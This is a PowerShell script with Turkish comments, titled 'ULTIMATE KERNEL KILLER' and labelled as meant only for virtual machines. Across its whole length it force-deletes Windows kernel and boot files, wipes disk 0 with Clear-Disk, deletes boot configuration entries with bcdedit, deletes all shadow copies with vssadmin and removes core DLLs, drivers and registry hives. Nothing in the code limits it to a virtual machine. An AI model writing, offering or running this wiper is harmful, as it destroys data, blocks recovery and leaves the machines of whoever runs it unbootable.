# ============================================================
# EN – KERNEL SİLME (ÇOK GÜÇLÜ – SADECE VM İÇİN!)
# ============================================================

Add-Type -AssemblyName System.Windows.Forms

try {
    # Kullanıcıya son uyarı
    [System.Windows.Forms.MessageBox]::Show(
        "KERNEL SİLME İŞLEMİ BAŞLIYOR!" +
        "`n`nBu işlem VM'yi tamamen yok eder." +
        "`nSADECE SANAL MAKİNE İÇİN!",
        "EN - ULTİMATE KERNEL KILLER",
        "OK",
        "Error"
    )

    # 1. Kernel dosyaları
    $kernelFiles = @(
        "C:\Windows\System32\ntoskrnl.exe",
        "C:\Windows\System32\ntkrnlpa.exe",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\winload.efi",
        "C:\Windows\System32\winresume.exe",
        "C:\Windows\System32\winresume.efi",
        "C:\Windows\System32\kdcom.dll",
        "C:\Windows\System32\pshed.dll",
        "C:\Windows\System32\bootvid.dll"
    )

    foreach ($file in $kernelFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    # 2. Boot sektörünü boz (MBR)
    try {
        $disk = Get-Disk | Where-Object { $_.Number -eq 0 }
        if ($disk) {
            Clear-Disk -Number $disk.Number -RemoveData -ErrorAction SilentlyContinue
            Write-Host "Disk MBR temizlendi." -ForegroundColor Red
        }
    } catch {}

    # 3. BCD (Boot Configuration Data) sil
    try {
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {default} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {bootmgr} /f"
        Start-Process -NoNewWindow -FilePath "bcdedit" -ArgumentList "/delete {current} /f"
        Write-Host "BCD silindi." -ForegroundColor Red
    } catch {}

    # 4. Sistem geri yükleme noktalarını temizle
    try {
        Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
        vssadmin delete shadows /all /quiet
        Write-Host "Geri yükleme noktaları temizlendi." -ForegroundColor Red
    } catch {}

    # 5. Kritik sistem dosyaları
    $systemFiles = @(
        "C:\Windows\System32\ntdll.dll",
        "C:\Windows\System32\kernel32.dll",
        "C:\Windows\System32\win32k.sys",
        "C:\Windows\System32\drivers\*",
        "C:\Windows\System32\config\*"
    )

    foreach ($file in $systemFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -Recurse -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    # 6. Son mesaj
    Write-Host "VM TAMAMEN YOK EDİLDİ!" -ForegroundColor Red -BackgroundColor Black
    Write-Host "Artık bu VM bir daha açılmaz." -ForegroundColor Red

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] ULTİMATE KERNEL SİLME İŞLEMİ TAMAMLANDI."

} catch {
    Write-Host "Kernel silme hatasi: $_" -ForegroundColor Red
}